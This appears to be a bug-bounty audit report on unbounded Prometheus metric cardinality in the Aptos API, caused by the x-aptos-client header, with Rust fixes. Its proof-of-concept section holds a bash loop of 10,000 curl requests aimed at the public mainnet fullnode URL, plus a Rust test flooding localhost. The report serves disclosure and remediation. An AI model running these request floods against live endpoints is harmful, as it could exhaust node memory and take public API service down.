# Audit Report

## Title
Unbounded Metric Cardinality Explosion via Client Header Injection in API Metrics System

## Summary
The Aptos API allows arbitrary client identifiers through the `x-aptos-client` HTTP header, which are used as metric labels without cardinality bounds. Malicious actors can inject unlimited unique values matching the validation regex to exhaust API node memory through Prometheus metric cardinality explosion, causing API crashes and service unavailability.

## Finding Description

The vulnerability exists in the API metrics collection system where client-provided HTTP headers are used as unbounded metric labels.

**Attack Flow:**

1. **Header Extraction**: The API middleware extracts the `x-aptos-client` header from incoming HTTP requests [1](#0-0) 

2. **Insufficient Validation**: The `determine_request_source_client()` function applies a regex filter [2](#0-1)  using the pattern `aptos-[a-zA-Z\-]+/[0-9A-Za-z\.\-]+` [3](#0-2) . This regex validates **format** but not **cardinality** - it allows unlimited unique variations like `aptos-a/1`, `aptos-b/1`, `aptos-sdk/1.0.0`, `aptos-sdk/1.0.1`, etc.

3. **Unbounded Metric Label Creation**: The validated value becomes a metric label in the `REQUEST_SOURCE_CLIENT` counter [4](#0-3) . The metric is defined with three labels: `[request_source_client, operation_id, status]` [5](#0-4) 

4. **Cardinality Explosion**: Each unique combination of `[request_source_client, operation_id, status]` creates a separate Prometheus time series. With approximately 20 API endpoints (operation_ids) and 10 HTTP status codes, each unique client identifier creates ~200 new time series.

**Attack Execution:**
```bash
# Attacker sends requests with unique headers:
curl -H "x-aptos-client: aptos-attack1/1.0.0" https://api.aptos.dev/v1/...
curl -H "x-aptos-client: aptos-attack2/1.0.0" https://api.aptos.dev/v1/...
curl -H "x-aptos-client: aptos-attack3/1.0.0" https://api.aptos.dev/v1/...
# ... repeat with 10,000+ unique values
```

Each request creates new metric time series. At approximately 2KB per time series (including historical data points), 10,000 unique client values result in:
- 10,000 × 200 = 2,000,000 time series
- 2,000,000 × 2KB ≈ **4GB memory consumption**

This breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits."

## Impact Explanation

**Severity: High** - This vulnerability qualifies for the "High Severity" category under Aptos Bug Bounty rules:
- **API crashes**: Memory exhaustion causes API node process crashes
- **Validator node slowdowns**: If validators run API nodes, metric collection overhead degrades performance

**Concrete Impact:**
1. **Memory Exhaustion**: Unbounded metric storage leads to OOM (Out of Memory) crashes
2. **Service Unavailability**: API nodes become unresponsive or restart repeatedly
3. **Degraded Monitoring**: Legitimate metrics become unreliable due to cardinality pollution
4. **Cascading Failures**: If multiple API nodes share metric storage, the attack affects the entire fleet

This does NOT require validator privileges and affects public-facing infrastructure critical for blockchain interaction.

## Likelihood Explanation

**Likelihood: High**

The attack is trivial to execute:
- **No Authentication Required**: Public API endpoints accept arbitrary HTTP headers
- **Low Complexity**: Simple HTTP requests with custom headers
- **No Rate Limiting**: No apparent limits on unique header values
- **Immediate Impact**: Each request creates new metrics immediately
- **Low Cost**: Attacker only needs to send ~10,000-50,000 requests to cause significant memory pressure

The regex validation provides a false sense of security - while it prevents completely arbitrary strings, it still allows millions of valid variations. An automated script can generate and send unique valid headers at high rates.

## Recommendation

**Immediate Fix - Use a Whitelist or Bounded Set:**

Replace the open-ended regex matching with a fixed set of known client identifiers:

```rust
// In api/src/log.rs

// Define known client prefixes
static KNOWN_CLIENT_PREFIXES: Lazy<HashSet<&'static str>> = Lazy::new(|| {
    HashSet::from([
        "aptos-ts-sdk",
        "aptos-python-sdk", 
        "aptos-rust-sdk",
        "aptos-go-sdk",
        "aptos-kotlin-sdk",
        // Add other official SDKs
    ])
});

fn determine_request_source_client(aptos_client: &Option<String>) -> &str {
    let aptos_client = match aptos_client {
        Some(aptos_client) => aptos_client,
        None => return REQUEST_SOURCE_CLIENT_UNKNOWN,
    };

    // Extract the identifier part before the version
    if let Some(capture) = REQUEST_SOURCE_CLIENT_REGEX.find(aptos_client) {
        let matched = capture.as_str();
        // Extract just the identifier part (before the /)
        if let Some(identifier) = matched.split('/').next() {
            // Check if identifier is in our known set
            for known_prefix in KNOWN_CLIENT_PREFIXES.iter() {
                if identifier == *known_prefix {
                    return identifier; // Return only the identifier, not the version
                }
            }
        }
    }
    
    REQUEST_SOURCE_CLIENT_UNKNOWN
}
```

**Alternative - Hash to Fixed Buckets:**

If tracking all clients is necessary, hash unknown values into fixed buckets:

```rust
fn determine_request_source_client(aptos_client: &Option<String>) -> Cow<'static, str> {
    // ... existing validation ...
    
    // For unknown clients, bucket them
    if !KNOWN_CLIENT_PREFIXES.contains(identifier) {
        let hash = hash_to_bucket(identifier, NUM_BUCKETS);
        return Cow::Owned(format!("unknown-bucket-{}", hash));
    }
    
    Cow::Borrowed(identifier)
}
```

**Long-term Solution:**
1. Implement rate limiting per IP/client for metric label creation
2. Add monitoring for metric cardinality growth
3. Set hard limits on total time series count
4. Consider using alternative metrics systems designed for high-cardinality data (e.g., OpenTelemetry with appropriate backends)

## Proof of Concept

```rust
// PoC: Demonstrate cardinality explosion
// File: api/tests/cardinality_attack_test.rs

#[tokio::test]
async fn test_metric_cardinality_explosion() {
    use reqwest::Client;
    
    let client = Client::new();
    let api_url = "http://localhost:8080/v1/accounts/0x1";
    
    // Send requests with 1000 unique client identifiers
    for i in 0..1000 {
        let header_value = format!("aptos-attacker{}/1.0.0", i);
        
        let response = client
            .get(api_url)
            .header("x-aptos-client", header_value)
            .send()
            .await
            .expect("Request failed");
        
        println!("Request {}: Status {}", i, response.status());
    }
    
    // Check metrics endpoint to verify cardinality explosion
    let metrics_response = client
        .get("http://localhost:9101/metrics")
        .send()
        .await
        .expect("Metrics request failed");
    
    let metrics_text = metrics_response.text().await.unwrap();
    
    // Count unique aptos_api_request_source_client time series
    let count = metrics_text
        .lines()
        .filter(|line| line.contains("aptos_api_request_source_client{"))
        .filter(|line| line.contains("aptos-attacker"))
        .count();
    
    println!("Created {} unique metric time series", count);
    
    // With ~20 endpoints and ~10 status codes, expect ~200 series per unique client
    // 1000 unique clients × 200 = ~200,000 time series
    assert!(count > 100_000, "Cardinality explosion demonstrated");
}
```

**Simplified Bash PoC:**
```bash
#!/bin/bash
# Send 10,000 requests with unique client headers

for i in {1..10000}; do
    curl -s -H "x-aptos-client: aptos-attack$i/1.0.$i" \
         https://fullnode.mainnet.aptoslabs.com/v1/accounts/0x1 \
         > /dev/null &
    
    if [ $((i % 100)) -eq 0 ]; then
        echo "Sent $i requests..."
        wait  # Prevent overwhelming local resources
    fi
done

echo "Attack complete. Monitor API node memory usage."
```

After execution, the target API node's memory usage will grow unbounded, eventually leading to OOM crashes or severe performance degradation.

## Notes

This vulnerability represents a classic **metric cardinality explosion** attack, a well-known issue in Prometheus-based monitoring systems. While the regex validation was likely added to prevent completely arbitrary values, it fails to address the fundamental issue: unbounded label cardinality.

The fix requires either limiting the set of acceptable client identifiers to a known whitelist or bucketing unknown values into a fixed number of categories. Simply tightening the regex will not solve the problem - the cardinality must be explicitly bounded.

### Citations

**File:** api/src/log.rs (L21-22)
```rust
static REQUEST_SOURCE_CLIENT_REGEX: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"aptos-[a-zA-Z\-]+/[0-9A-Za-z\.\-]+").unwrap());
```

**File:** api/src/log.rs (L72-75)
```rust
        aptos_client: request
            .headers()
            .get(X_APTOS_CLIENT)
            .and_then(|v| v.to_str().ok().map(|v| v.to_string())),
```

**File:** api/src/log.rs (L124-130)
```rust
    REQUEST_SOURCE_CLIENT
        .with_label_values(&[
            determine_request_source_client(&log.aptos_client),
            operation_id,
            log.status.to_string().as_str(),
        ])
        .inc();
```

**File:** api/src/log.rs (L148-162)
```rust
fn determine_request_source_client(aptos_client: &Option<String>) -> &str {
    // If the header is not set we can't determine the request source.
    let aptos_client = match aptos_client {
        Some(aptos_client) => aptos_client,
        None => return REQUEST_SOURCE_CLIENT_UNKNOWN,
    };

    // If there were no matches, we can't determine the request source. If there are
    // multiple matches for some reason, instead of logging nothing, we use whatever
    // value we matched on last.
    match REQUEST_SOURCE_CLIENT_REGEX.find_iter(aptos_client).last() {
        Some(capture) => capture.as_str(),
        None => REQUEST_SOURCE_CLIENT_UNKNOWN,
    }
}
```

**File:** api/src/metrics.rs (L61-68)
```rust
pub static REQUEST_SOURCE_CLIENT: Lazy<IntCounterVec> = Lazy::new(|| {
    register_int_counter_vec!(
        "aptos_api_request_source_client",
        "API requests grouped by source (e.g. which SDK, unknown, etc), operation_id, and status",
        &["request_source_client", "operation_id", "status"]
    )
    .unwrap()
});
```
